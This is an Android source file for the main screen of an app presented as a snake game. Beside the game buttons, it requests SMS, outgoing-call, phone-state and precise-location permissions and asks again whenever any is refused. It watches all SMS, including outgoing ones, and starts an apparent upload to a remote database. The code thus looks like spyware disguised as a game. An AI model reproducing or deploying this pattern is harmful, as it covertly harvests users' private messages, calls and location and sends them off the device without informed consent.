package com.example.s1300465.snake;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends AppCompatActivity {
    DatabaseHelper dbh;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        dbh = new DatabaseHelper(this);

        getPermissions();

        //For Debugging purposes:
        (findViewById(R.id.textView)).setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Intent dbmanager = new Intent(getApplicationContext(), AndroidDatabaseManager.class);
                startActivity(dbmanager);
            }
        });

        //Have to register a ContentObserver to list for all SMS in order to obtain outgoing ones
        //as there's no Broadcast Receiver action for outgoing (or at least it doesn't work)
        ContentResolver contentResolver = getApplicationContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, new OutgoingSMSObserver(new Handler(), getApplicationContext(), contentResolver));

        new RemoteDatabaseHelper(this).checkConnectionAndUpload();
    }

    public boolean getPermissions(){
        ArrayList<String> permissions = new ArrayList<>();
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.READ_PHONE_STATE);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.RECEIVE_SMS);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.READ_SMS);
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_DENIED){
            permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        }

        if(permissions.size() == 0) {
            return true;
        }

        ActivityCompat.requestPermissions(this, permissions.toArray(new String[permissions.size()]), 0);
        return false;
    }

    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        //If any of the requests were denied, just keep asking again
        if(Arrays.asList(grantResults).contains(PackageManager.PERMISSION_DENIED)){
            getPermissions();
        }
    }

    public void startNewGame(View v){
        startActivity(new Intent(this, GameScreen.class));
    }

    public void openHighScores(View v){
        startActivity(new Intent(this, HighScoresActivity.class));
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);

    }
}
